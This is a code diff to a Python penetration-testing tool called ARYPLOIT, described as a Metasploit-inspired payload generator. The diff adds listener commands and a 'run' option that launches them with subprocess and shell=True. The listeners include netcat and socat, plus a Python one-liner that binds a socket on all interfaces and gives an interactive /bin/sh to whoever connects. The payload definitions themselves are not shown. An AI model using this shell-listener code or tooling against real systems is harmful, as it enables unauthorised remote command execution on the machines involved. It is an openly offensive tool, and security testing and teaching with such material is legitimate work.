@@ -11,6 +11,7 @@ import base64
 import urllib.parse
 import binascii
 import codecs
+import subprocess
 from termcolor import colored
 from colorama import init
 
@@ -19,7 +20,7 @@ init(autoreset=True)
 # Banner
 def banner():
     print(colored(pyfiglet.figlet_format("ARYPLOIT"), "green"))
-    print(colored("⚠️ FOR EDUCATIONAL & AUTHORIZED TESTING ONLY ⚠️", "red"))
+    print(colored("⚠ FOR EDUCATIONAL & AUTHORIZED TESTING ONLY ⚠", "red"))
     print(colored("Inspired by Metasploit - All-in-One Payload Generator", "yellow"))
     print(colored("Author: Aryan", "magenta"))
     print()
@@ -87,7 +88,11 @@ encoders = {
     "none": lambda s: s,
 }
 
-listeners = ["python", "nc", "socat"]
+listeners = {
+    "nc": "nc -lvnp {LPORT}",
+    "socat": "socat TCP-LISTEN:{LPORT},fork STDOUT",
+    "python": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{LPORT}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+}
 
 current_payload = None
 current_type = None
@@ -95,6 +100,7 @@ current_encoder = None
 LHOST = ""
 LPORT = ""
 encoder_chain = []
+current_listener = None
 
 def show_help():
     print(colored("Available commands:", "cyan"))
@@ -105,9 +111,10 @@ def show_help():
     print(colored("  set payload <type>/<payload_name> - Set payload", "yellow"))
     print(colored("  set lhost <ip>    - Set LHOST for reverse shell", "yellow"))
     print(colored("  set lport <port>  - Set LPORT", "yellow"))
-    print(colored("  set encoder <encoder1,encoder2,...> - Set encoder(s) (e.g., base64,url,hex)", "yellow"))
+    print(colored("  set listener <type> - Set listener type (nc, socat, python)", "yellow"))
+    print(colored("  set encoder <encoder1,encoder2,...> - Set encoder(s)", "yellow"))
     print(colored("  generate          - Generate payload", "yellow"))
-    print(colored("  listener <type>   - Show listener example", "yellow"))
+    print(colored("  run               - Start the listener", "yellow"))
     print(colored("  info              - Show info about payload", "yellow"))
     print(colored("  help              - Show this message", "yellow"))
     print(colored("  exit              - Exit tool", "yellow"))
@@ -195,20 +202,30 @@ def payload_info():
     print(colored(f"Selected Payload: {current_type}/{current_payload}", "cyan"))
 
 def show_listener(listener_type):
-    example = ""
-    if listener_type == "python":
-        example = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{LPORT}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
-    elif listener_type == "nc":
-        example = f"nc -lvnp {LPORT}"
-    elif listener_type == "socat":
-        example = f"socat TCP-LISTEN:{LPORT},fork STDOUT"
+    global LPORT
+    if listener_type in listeners:
+        example = listeners[listener_type].format(LPORT=LPORT)
+        print(colored(f"Listener Example ({listener_type}): {example}", "green"))
     else:
         print("Unknown listener type")
+
+def run_listener():
+    global current_listener, LPORT
+    if not current_listener:
+        print("Set a listener first with 'set listener <type>'")
         return
-    print(colored(f"Listener Example ({listener_type}): {example}", "green"))
+    if not LPORT:
+        print("Set LPORT first with 'set lport <port>'")
+        return
+    listener_cmd = listeners[current_listener].format(LPORT=LPORT)
+    print(colored(f"[+] Starting listener: {listener_cmd}", "green"))
+    try:
+        subprocess.Popen(listener_cmd, shell=True)
+    except Exception as e:
+        print(f"Failed to start listener: {e}")
 
 def main():
-    global current_payload, current_type, encoder_chain, LHOST, LPORT
+    global current_payload, current_type, encoder_chain, LHOST, LPORT, current_listener
     banner()
     while True:
         try:
@@ -253,8 +270,10 @@ def main():
                     value = ' '.join(parts[2:])
                     if option == "lhost":
                         LHOST = value
+                        print(f"[+] LHOST set to: {LHOST}")
                     elif option == "lport":
                         LPORT = value
+                        print(f"[+] LPORT set to: {LPORT}")
                     elif option == "encoder":
                         encoder_chain = [e.strip() for e in value.split(",")]
                         for encoder in encoder_chain:
@@ -264,6 +283,12 @@ def main():
                                 break
                         else:
                             print(f"[+] Encoder chain set: {', '.join(encoder_chain)}")
+                    elif option == "listener":
+                        if value in listeners:
+                            current_listener = value
+                            print(f"[+] Listener set to: {current_listener}")
+                        else:
+                            print(f"Unknown listener. Available: {', '.join(listeners.keys())}")
                     elif option == "payload":
                         if "/" in value:
                             current_type, current_payload = value.split("/", 1)
@@ -275,11 +300,13 @@ def main():
                         else:
                             print("Usage: set payload <type>/<payload_name>")
                     else:
-                        print("Unknown set option. Available: lhost, lport, encoder, payload")
+                        print("Unknown set option. Available: lhost, lport, encoder, payload, listener")
                 else:
                     print("Usage: set <option> <value>")
             elif cmd.startswith("generate"):
                 generate_payload()
+            elif cmd == "run":
+                run_listener()
             elif cmd.startswith("info"):
                 payload_info()
             elif cmd.startswith("listener"):
